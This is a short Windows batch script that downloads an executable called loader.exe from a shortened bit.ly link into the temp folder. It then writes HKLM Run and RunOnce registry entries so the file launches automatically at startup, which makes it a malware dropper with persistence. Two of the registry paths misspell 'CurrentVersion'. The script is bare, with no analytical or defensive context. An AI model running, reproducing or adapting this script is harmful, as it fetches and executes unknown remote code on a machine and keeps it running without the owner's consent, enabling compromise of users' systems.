set "str1=\"%tmp%\loader.exe\""
set "str2=--auto-start"
wget http://bit.ly/ggmtd0 --output-document="%tmp%\loader.exe"
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v "load" /t REG_SZ /d "%str1% %str2%" /F
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce /v "load" /t REG_SZ /d "%str1% %str2%" /F
reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurentVersion\Run /v "load" /t REG_SZ /d "%str1% %str2%" /F
reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurentVersion\RunOnce /v "load" /t REG_SZ /d "%str1% %str2%" /F